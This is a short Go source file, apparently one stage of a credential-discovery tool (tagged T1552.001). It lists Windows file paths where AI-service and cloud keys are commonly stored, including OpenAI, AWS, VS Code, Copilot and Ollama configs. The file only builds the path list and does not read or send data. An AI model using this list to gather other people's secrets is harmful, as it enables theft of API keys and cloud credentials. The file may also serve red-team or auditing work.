//go:build windows

// Windows candidate paths for AI-service key discovery (Stage 1, T1552.001).

package main

import (
	"os"
	"path/filepath"
)

// candidateKeyPaths returns common on-disk locations where AI-service API keys
// are stored on Windows user endpoints.
func candidateKeyPaths() []string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		home = os.Getenv("USERPROFILE")
	}
	var paths []string
	if home != "" {
		paths = append(paths,
			filepath.Join(home, ".env"),
			filepath.Join(home, ".openai"),
			filepath.Join(home, ".config", "openai", "auth.json"),
			filepath.Join(home, ".aws", "credentials"),
			filepath.Join(home, "AppData", "Roaming", "Code", "User", "settings.json"),
			filepath.Join(home, ".continue", "config.json"),
			filepath.Join(home, ".ollama", "config.json"),
		)
	}
	if appdata := os.Getenv("APPDATA"); appdata != "" {
		paths = append(paths,
			filepath.Join(appdata, "Code", "User", "settings.json"),
			filepath.Join(appdata, "github-copilot", "hosts.json"),
		)
	}
	return paths
}
